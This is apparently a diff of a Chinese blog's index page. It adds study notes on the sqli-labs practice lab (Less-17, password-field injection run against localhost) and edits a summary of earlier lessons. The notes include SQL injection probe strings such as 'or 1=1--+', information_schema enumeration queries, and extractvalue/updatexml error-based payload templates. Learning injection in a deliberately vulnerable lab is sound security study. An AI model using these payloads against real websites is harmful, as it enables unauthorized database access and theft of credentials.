@@ -64,6 +64,54 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql-labs-Less-17" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/09/sql-labs-Less-17/" class="article-date">
+  <time datetime="2021-02-09T08:35:56.000Z" itemprop="datePublished">2021-02-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/09/sql-labs-Less-17/">sql-labs-Less-17</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1>Less-17</h1>
+
+<p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-17/%EF%BC%8C%E6%98%BE%E7%A4%BA%E5%A6%82%E4%B8%8B%EF%BC%9A">http://127.0.0.1/sql/Less-17/，显示如下：</a></p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/09/sql-labs-Less-17/1.png" alt="1"><br>在username里输入admin，password里输入1’（这里是因为不知道密码）,报错了：</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/09/sql-labs-Less-17/2.png" alt="2"><br>再把password的1’改成1’#。正常输出，说明可以用’注入。<br>接下来就在password那里进行注入可以用布尔盲注、延时注入和报错注入。<br>然后求出表名：users，列名：username和password。</p>
+<h1>小结</h1>
+1.这次我们为什么不在username进行注入而是在password进行注入呢？
+
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/09/sql-labs-Less-17/3.png" alt="3"><br>我们查看源代码发现一个check_input()函数。<br>check_input()函数有什么用呢,先说一下下面这些函数：</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/09/sql-labs-Less-17/4.png" alt="4"><br><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/09/sql-labs-Less-17/5.png" alt="5"><br>在我们less17的check_input()中，对username进行各种转义的处理，所以此处不能使用username进行注入。</p>
+<p>2.报错注入<br>select extractvalue(1,concat(0x7e,(构造的语句),0x7e));<br>//select extractvalue(1,concat(0x7e,(select database()),0x7e));</p>
+<p>select updatexml(1,concat(0x7e,(构造的语句),0x7e),1);<br>//select updatexml(1,concat(0x7e,(select database()),0x7e),1);</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/09/sql-labs-Less-17/" data-id="ckky8po0o00006oux6wfogw23" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-sql-labs-Less-13~16" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/02/07/sql-labs-Less-13~16/" class="article-date">
@@ -498,7 +546,7 @@
 <h2>Less-1~4小结</h2>
 
 <p>1.在输入id=1后，可以尝试用<code>&#39;</code>、<code>&quot;</code>、<code>&#39;)</code>、<code>&quot;)</code>、<code>)</code>、<code>&quot;)</code>、<code>&quot;))</code>来判断用什么字符注入（①有报错：也可以用<code>\</code>来判断，只要看报错语句中<code>\</code>后面是什么，而且更方便；②无报错：先输入前面的字符，一般是不能正常输出，再在后面加上–+，如果可以正常输出，说明可以用该字符注入(即存在注入漏洞)）。<br>2. 常用语句<br>    查库：select schema_name from information_schema.schemata<br>        //从information_schema.schemata查库名（schema_name）<br>    查表：select table_name from information_schema.tables where table_schema=’被查的库的名称’<br>        //从’被查的库的名称’库查表名<br>        //select table_name from information_schema.tables where table_schema=’security’<br>    查列：select column_name from information_schema.columns where table_name=’被查的表的名称’<br>        //从’被查的表的名称’表查列名<br>        //select column_name from information_schema.columns where table_name=’users’<br>    查字段：select 要查的列名1,要查的列名2 from 库名.表名<br>        //分别查列1和列2的字段<br>        //select group_concat(username),group_concat(password) from 库名.表名<br>    查数据：select 要查的列名1,要查的列名2 from 库名.表名 where id=(？)<br>        //从’被查的列的名称’表查id为？的一组数据<br>        //select id,username,password from security.users where id=1</p>
-<p>3.一般用于尝试的语句（求注入字符，–+可以用#替换）<br>1)注释法<br>    or 1=1–+<br>    ‘or 1=1–+<br>    “or 1=1–+<br>    )or 1=1–+<br>    ‘)or 1=1–+<br>    “) or 1=1–+<br>    “))or 1=1–+<br>以上正常输出时，说明可以注入；<br>    and 1=1–+<br>    and 1=2–+<br>以上前者正常输出，后者既不输出也不报错时，说明可以注入。<br>2)闭合法<br>    *<em>（类似<code>)(</code>或<code>&quot;)(&quot;</code>）<br>4.注入<br>    1)注释法（–+可以用#替换）<br>    * 构造的语句 –+<br>    2)闭合法（*为求出的注入字符或</em>字符的另一半）<br>    * 构造的语句 and/or <em>1</em>=*1</p>
+<p>3.一般用于尝试的语句（求注入字符，–+可以用#替换）<br>1)注释法<br>    or 1=1–+<br>    ‘or 1=1–+<br>    “or 1=1–+<br>    )or 1=1–+<br>    ‘)or 1=1–+<br>    “) or 1=1–+<br>    “))or 1=1–+<br>以上正常输出时，说明可以注入；<br>    and 1=1–+<br>    and 1=2–+<br>以上前者正常输出，后者既不输出也不报错时，说明可以注入。<br>2)闭合法<br>    *<em>（类似<code>)(</code>或<code>&quot;)(&quot;</code>）（双重及以上层包裹的会误判为里面一层的字符，如在(‘id’)这种情况时，会存在误判注入字符为’，误判的话接下来的注入就会出错）<br>4.注入<br>    1)注释法（–+可以用#替换）<br>    * 构造的语句 –+<br>    2)闭合法（*为求出的注入字符或</em>字符的另一半）<br>    * 构造的语句 and/or <em>1</em>=*1</p>
 <p>5.常用函数<br>    group_concat(str1,str2,…)————连接一个组的所有字符串，并以逗号分隔每一条数据。</p>
 <p>6.union操作符<br>用于合并两个或多个 SELECT 语句的结果集。请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。<br>列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的 列的顺序必须相同。</p>
 <p>7.SQL注入必备知识初级：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41420747/article/details/81773481">https://blog.csdn.net/qq_41420747/article/details/81773481</a></p>
@@ -602,55 +650,6 @@
 
 
   
-    <article id="post-用scanf输入字符时字符无效的解决办法" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/10/20/%E7%94%A8scanf%E8%BE%93%E5%85%A5%E5%AD%97%E7%AC%A6%E6%97%B6%E5%AD%97%E7%AC%A6%E6%97%A0%E6%95%88%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/" class="article-date">
-  <time datetime="2020-10-20T09:49:47.000Z" itemprop="datePublished">2020-10-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/20/%E7%94%A8scanf%E8%BE%93%E5%85%A5%E5%AD%97%E7%AC%A6%E6%97%B6%E5%AD%97%E7%AC%A6%E6%97%A0%E6%95%88%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/">用scanf输入字符时字符无效的解决办法</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="关于用scanf输入字符时字符无效的解决办法"><a href="#关于用scanf输入字符时字符无效的解决办法" class="headerlink" title="关于用scanf输入字符时字符无效的解决办法"></a>关于用scanf输入字符时字符无效的解决办法</h1><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>用scanf输入字符串，运行后出现提示:</p>
-<blockquote>
-<blockquote>
-<p>0x796B98F1 (ucrtbased.dll)处(位于 1.exe 中)引发的异常:<br><br>     0xC0000005: 写入位置 0x007D1343 时发生访问冲突。<br></p>
-</blockquote>
-</blockquote>
-<p>以及下方提示：</p>
-<blockquote>
-<p>&lt;字符串中的字符无效&gt;</p>
-</blockquote>
-<p>错误的地方:</p>
-<p>#include &lt;stdio.h&gt;<br><br>int main()<br><br>{<br><br>     char a, b, c;<br><br>     scanf_s(“%c %c %c”,<code> &amp;a, &amp;b, &amp;c</code>);&lt;&lt;&lt;&lt;&lt;&lt;(错误)<br><br>     printf(“%d,%d,%d”, a,b,c);<br><br>     return 0;<br><br>}</p>
-<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>可在scanf中输入的字符后输入“整数，”，如下：<br>#include &lt;stdio.h&gt;<br><br>int main()<br><br>{<br><br>     char a, b, c;<br><br>     scanf_s(“%c %c %c”, <code>&amp;a, 1，&amp;b, 1，&amp;c，1</code>);<br><br>     printf(“%d,%d,%d”, a,b,c);<br><br>     return 0;<br><br>}</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/20/%E7%94%A8scanf%E8%BE%93%E5%85%A5%E5%AD%97%E7%AC%A6%E6%97%B6%E5%AD%97%E7%AC%A6%E6%97%A0%E6%95%88%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/" data-id="ckght635y0000owuxax9x6h4k" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -687,6 +686,10 @@
       <ul>
         
           <li>
+            <a href="/2021/02/16/sql-labs-Less-26a/">sql-labs-Less-26a</a>
+          </li>
+        
+          <li>
             <a href="/2021/02/16/sql-labs-Less-26/">sql-labs-Less-26</a>
           </li>
         
@@ -700,10 +703,6 @@
         
           <li>
             <a href="/2021/02/14/sql-labs-Less-24/">sql-labs-Less-24</a>
-          </li>
-        
-          <li>
-            <a href="/2021/02/13/sql-labs-Less-23/">sql-labs-Less-23</a>
           </li>
         
       </ul>
